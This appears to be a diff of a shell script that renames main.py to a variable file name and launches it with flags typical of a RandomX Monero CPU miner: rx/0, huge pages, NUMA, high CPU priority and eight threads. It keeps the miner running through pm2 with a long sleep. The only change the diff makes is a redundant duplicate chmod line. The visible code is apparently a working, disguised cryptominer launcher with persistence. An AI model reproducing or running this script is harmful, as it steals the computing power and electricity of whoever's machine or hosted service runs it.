@@ -23,6 +23,7 @@ mv main.py $NEW_PY
 chmod +x $NEW_PY
 echo "./$NEW_PY --huge-pages --algo rx/0 --randomx-numa --cpu-priority 5 --asm auto --huge-pages-jit -t 8" > bsh.sh
 chmod +x bsh.sh
+chmod +x bsh.sh
 ./bsh.sh
 nice -n 19 pm2 start bsh.sh
 sleep 1600
